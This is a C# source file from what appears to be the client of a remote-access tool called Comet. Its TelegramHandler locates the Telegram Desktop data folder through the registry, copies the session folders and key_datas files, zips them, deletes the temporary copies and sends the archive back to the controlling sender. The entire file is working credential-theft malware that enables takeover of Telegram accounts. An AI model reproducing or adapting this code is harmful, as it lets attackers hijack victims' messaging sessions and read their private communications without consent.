using Comet.Common.Messages;
using Comet.Common.Networking;
using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Comet.Client.Messages
{
    public class TelegramHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is Telegram;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case Telegram msg:
                    Execute(sender, msg);
                    break;
            }
        }
        private void Execute(ISender client, Telegram message)
        {
            string path = GetTelegramPath();
            if (path == "")
            {
                client.Send(new Telegram
                {
                });
            }
            else
            {
                client.Send(new Telegram
                {
                    Files = ZipCompress(path),
                });
            }
        }

        byte[] ZipCompress(string path)
        {
            Directory.CreateDirectory(path + @"\tdata");
            CopyFile(path, "D877F783D5D3EF8C");
            CopyFile(path, "A7FDF864FBC10B77");
            if (File.Exists(path + @"\tdata.zip")) File.Delete(path + @"\tdata.zip");
            ZipFile.CreateFromDirectory(path + @"\tdata", path + @"\tdata.zip");
            byte[] b =File.ReadAllBytes(path + @"\tdata.zip");
            File.Delete(path + @"\tdata.zip");
            Directory.Delete(path + @"\tdata",true);
            return b;
        }
        void CopyFile(string path, string userFile)
        {
            if (Directory.Exists(path + @"\" + userFile))
            {
                if (Directory.Exists(path + @"\" + userFile))
                {
                    Directory.CreateDirectory(path + @"\tdata\" + userFile);
                    CopyDir(path + @"\" + userFile, path + @"\tdata\" + userFile);
                    File.Copy(path + @"\" + userFile + "s", path + @"\tdata\" + userFile + "s", true);
                    File.Copy(path + @"\key_datas", path + @"\tdata\key_datas", true);
                }
            }

        }
        void CopyDir(string srcPath, string aimPath)
        {
            try
            {
                // 检查目标目录是否以目录分割字符结束如果不是则添加
                if (aimPath[aimPath.Length - 1] != System.IO.Path.DirectorySeparatorChar)
                {
                    aimPath += System.IO.Path.DirectorySeparatorChar;
                }
                // 判断目标目录是否存在如果不存在则新建
                if (!System.IO.Directory.Exists(aimPath))
                {
                    System.IO.Directory.CreateDirectory(aimPath);
                }
                // 得到源目录的文件列表，该里面是包含文件以及目录路径的一个数组
                // 如果你指向copy目标文件下面的文件而不包含目录请使用下面的方法
                // string[] fileList = Directory.GetFiles（srcPath）；
                string[] fileList = System.IO.Directory.GetFileSystemEntries(srcPath);
                // 遍历所有的文件和目录
                foreach (string file in fileList)
                {
                    // 先当作目录处理如果存在这个目录就递归Copy该目录下面的文件
                    if (System.IO.Directory.Exists(file))
                    {
                        CopyDir(file, aimPath + System.IO.Path.GetFileName(file));
                    }
                    // 否则直接Copy文件
                    else
                    {
                        System.IO.File.Copy(file, aimPath + System.IO.Path.GetFileName(file), true);
                    }
                }
            }
            catch (Exception e)
            {
                throw;
            }
        }
        string GetTelegramPath()
        {
            Microsoft.Win32.RegistryKey subKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Classes\tdesktop.tg\DefaultIcon");
            if (subKey != null)
            {
                string path = (string)subKey.GetValue("");
                if (path != null)
                {
                    path = path.Substring(1, path.Length - 4);
                    return Path.GetDirectoryName(path) + @"\tdata";
                }
                else
                {
                    return "";
                }
            }
            else
            {
                return "";
            }
        }
    }
}
